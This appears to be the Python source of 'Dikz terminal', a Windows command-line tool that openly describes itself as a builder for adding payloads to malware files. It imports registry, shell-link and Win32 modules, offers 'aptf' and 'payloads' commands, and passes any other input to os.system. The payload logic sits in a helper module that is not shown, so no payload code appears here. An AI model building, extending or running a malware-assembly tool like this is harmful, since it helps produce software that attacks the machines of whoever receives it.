import os
import sys
import time
import glob
import shutil
import socket
import subprocess
import threading
import ctypes
import requests
import base64
import winreg as reg
from colorama import Fore, init, Back
import winshell
import win32com.client
import win32api, win32con
from dikz_funcs import *

os_comp()
init()
cls()
logo_com()
print(f"""

Welcome to Dikz terminal, type "help" to get program commands.

""")

def comandeget():
    print()
    commande = input(f"{Fore.RED}[{Fore.YELLOW}%{Fore.RED}]{Fore.RESET} {Fore.RED}[{Fore.YELLOW}Dikz Terminal{Fore.RED}] > {Fore.RESET}")
    if commande == "help":
        print("""
        - aptf <payload filename> <malware filename> (Add payload to malware.)
        - payloads                                   (Show payloads.)
        """)
    elif len(commande.split(" ")) > 1:
        newcommande = commande.split(" ")
        if newcommande[0] == "aptf":
            aptf(newcommande[1],newcommande[2])
    else:
        os.system(commande)

while True:
    comandeget()
# aptf("deps.py", "mlw.py")
